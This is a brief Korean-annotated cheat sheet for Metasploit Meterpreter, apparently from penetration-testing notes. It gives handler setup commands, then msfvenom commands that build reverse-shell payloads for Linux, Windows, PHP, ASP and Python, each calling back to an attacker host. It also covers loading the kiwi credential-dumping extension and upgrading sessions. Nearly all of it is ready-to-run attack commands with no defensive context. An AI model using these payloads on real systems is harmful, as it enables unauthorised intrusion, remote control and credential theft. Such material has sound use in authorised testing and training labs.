# Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target

> 무엇: 타깃에서 메모리에만 상주하고 디스크에 기록하지 않는 Meterpreter — 핸들러 세팅, Linux/Windows/PHP/ASP/Python용 msfvenom 리버스 페이로드 생성, load python·kiwi, sessions -u 셸 업그레이드를 다룬다.
> 언제: 웹 업로드나 RCE로 명령 실행을 확보한 뒤, 일반 셸 대신 안정적인 meterpreter 세션으로 올릴 때.
> 조건: 공격자 측 exploit/multi/handler에 payload·lhost·lport를 먼저 세팅해 둬야 하고, 페이로드 실행이 같은 LHOST/LPORT로 돌아와야 세션이 붙는다.

shell

## setting

msf6 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
msf6 exploit(multi/handler) > show options

## output executable file on linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

## Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

## PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

## ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

## Python

msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

## load

load python
load kiwi

## upgrade shell

sessions -u 3
